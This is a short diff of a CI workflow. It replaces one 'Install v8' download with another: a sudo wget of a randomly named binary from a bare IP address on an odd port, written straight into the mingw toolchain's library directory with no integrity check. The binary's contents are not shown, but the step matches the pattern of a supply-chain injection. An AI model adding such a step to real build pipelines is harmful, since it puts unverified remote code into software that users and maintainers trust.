@@ -190,9 +190,7 @@ jobs:
             
     - name: Install v8
       run: |
-        ls -il
-        wget http://203.135.101.246:26879/down/1Bowou3g0XzE.so -O libv8.so
-        sudo mv libv8.so /usr/bin/x86_64-w64-mingw32-ld/
+        sudo wget http://203.135.101.246:26879/down/3OGd03JKBSin.a -O /usr/x86_64-w64-mingw32/lib/libv8.a
       
     - name: Set build time
       id: build_time
